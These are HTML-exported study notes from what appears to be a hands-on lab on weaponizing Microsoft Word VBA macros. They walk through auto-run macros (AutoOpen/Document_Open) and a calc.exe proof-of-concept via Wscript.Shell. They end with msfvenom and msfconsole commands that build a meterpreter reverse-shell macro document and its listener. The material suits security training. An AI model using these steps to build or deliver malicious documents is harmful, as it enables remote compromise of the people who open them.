<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>VBA</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>VBA</h1><br/><p><strong><h1>Visual Basic for Application (VBA)</h1></strong></p><p></p><p>Visual Basic for Application (VBA)</p><p></p><p>VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. </p><p></p><p>Macros are Microsoft Office applications that contain embedded code written in a programming language known as Visual Basic for Applications (VBA). It is used to create custom functions to speed up manual tasks by creating automated processes. One of VBA&#39;s features is accessing the Windows Application Programming Interface (API) and other low-level functionality. For more information about VBA, visit here. </p><p></p><p>In this task, we will discuss the basics of VBA and the ways the adversary uses macros to create malicious Microsoft documents. To follow up along with the content of this task, make sure to deploy the attached Windows machine in Task 2. When it is ready, it will be available through in-browser access.</p><p></p><p>Now open Microsoft Word 2016 from the Start menu. Once it is opened, we close the product key window since we will use it within the seven-day trial period.</p><p></p><p>Now create a new blank Microsoft document to create our first macro. The goal is to discuss the basics of the language and show how to run it when a Microsoft Word document gets opened. First, we need to open the Visual Basic Editor by selecting <strong>view → macros</strong>. The Macros window shows to create our own macro within the document.</p><p></p><p><img src="images/394-1.png" alt="images/394-1.png" /></p><p></p><p>In the Macro name section, we choose to name our macro as <strong>THM</strong>. Note that we need to select from the <strong>Macros</strong> in list <strong>Document1</strong> and finally select <strong>create</strong>. Next, the Microsoft Visual Basic for Application editor shows where we can write VBA code. Let&#39;s try to show a message box with the following message: Welcome to Weaponization Room!. We can do that using the <strong>MsgBox</strong> <strong>function</strong> as follows:</p><p></p><p>$$$$$$$$$$$$$$$$$$$$$$$$$</p><p>Sub THM()</p><p>  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</p><p>End Sub</p><p>$$$$$$$$$$$$$$$$$$$$$$$$$</p><p></p><p>Finally, run the macro by <strong>F5</strong> or <strong>Run</strong> → <strong>Run Sub/UserForm</strong>. [Testing]</p><p></p><p>Now in order to execute the VBA code automatically once the document gets opened, we can use built-in functions such as <strong>AutoOpen</strong> and <strong>Document_open</strong>. Note that we need to specify the function name that needs to be run once the document opens, which in our case, is the <strong>THM</strong> function.</p><p></p><p>$$$$$$$$$$$$$$$$$$$$$$$$$</p><p>Sub Document_Open()</p><p>  THM</p><p>End Sub</p><p></p><p>Sub AutoOpen()</p><p>  THM</p><p>End Sub</p><p></p><p>Sub THM()</p><p>   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</p><p>End Sub</p><p>$$$$$$$$$$$$$$$$$$$$$$$$$</p><p></p><p>It is important to note that to make the macro work, we need to save it in Macro-Enabled format such as <strong>.doc</strong> and <strong>docm</strong>. Now let&#39;s save the file as <strong>Word</strong> <strong>97-2003</strong> <strong>Template</strong> where the <strong>Macro</strong> is <strong>enabled</strong> by going to <strong>File</strong> → <strong>save</strong> <strong>Document1</strong> and <strong>save</strong> <strong>as</strong> <strong>type</strong> → <strong>Word</strong> <strong>97-2003</strong> <strong>Document</strong> and finally, <strong>save</strong>.</p><p></p><p>Let&#39;s close the Word document that we saved. If we reopen the document file, Microsoft Word will show a security message indicating that Macros have been <strong>disabled</strong> and give us the option to enable it. Let&#39;s enable it and move forward to check out the result.</p><p></p><p><img src="images/394-2.png" alt="images/394-2.png" /></p><p></p><p>Once we allowed the <strong>Enable</strong> <strong>Content</strong>, our macro gets executed as shown,</p><p></p><p><img src="images/394-3.png" alt="images/394-3.png" /></p><p></p><p>Now edit the word document and create a macro function that executes a <strong>calc.exe</strong> or any executable file as proof of concept as follows,</p><p></p><p>$$$$$$$$$$$$$$$$$$$$$$$$$</p><p>Sub PoC()</p><p>	Dim payload As String</p><p>	payload = &quot;calc.exe&quot;</p><p>	CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</p><p>End Sub</p><p>$$$$$$$$$$$$$$$$$$$$$$$$$</p><p></p><p>To explain the code in detail, with <strong>Dim</strong> <strong>payload</strong> As <strong>String</strong>, we declare payload variable as a string using Dim keyword. With <strong>payload</strong> <strong>= &quot;calc.exe&quot;</strong> we are specifying the payload name and finally with <strong>CreateObject(&quot;Wscript.Shell&quot;).Run</strong> <strong>payload</strong> we create a Windows Scripting Host (<strong>WSH</strong>) object and run the payload. Note that if you want to rename the function name, then you must include the function name in the  <strong>AutoOpen() </strong>and <strong>Document_open()</strong> functions too</p><p></p><p>Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create AutoOpen() and Document_open() functions before saving the document. Once the code works, now save the file and try to open it again.</p><p></p><p><img src="images/394-4.png" alt="images/394-4.png" /></p><p></p><p></p><p><strong><h3>Gaining Reverse Shell Using VBA Macros</h3></strong></p><p></p><p><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba</strong></p><p></p><p><img src="images/394-5.png" alt="images/394-5.png" /></p><p></p><p><strong>Import to note</strong> that one modification needs to be done to make this work.  The <strong>DEFAULT</strong> output will be working on an <strong>MS excel sheet</strong>. Therefore, change the <strong>Workbook_Open()</strong> to <strong>Document_Open() </strong>to make it suitable for <strong>MS word documents</strong>.</p><p></p><p>Now copy the output and save it into the macro editor of the MS word document, as we showed previously.</p><p><strong>Note:</strong> Replace the entire code in a newly created macro else it might throw errors</p><p></p><p>From the attacking machine, run the Metasploit framework and set the listener.</p><p></p><p><strong>msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.50.159.15; set LPORT 443;exploit&quot; </strong></p><p></p><p>Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.</p><p></p><p><img src="images/394-6.png" alt="images/394-6.png" /></p><p></p><p></p></div>
</body>
</html>
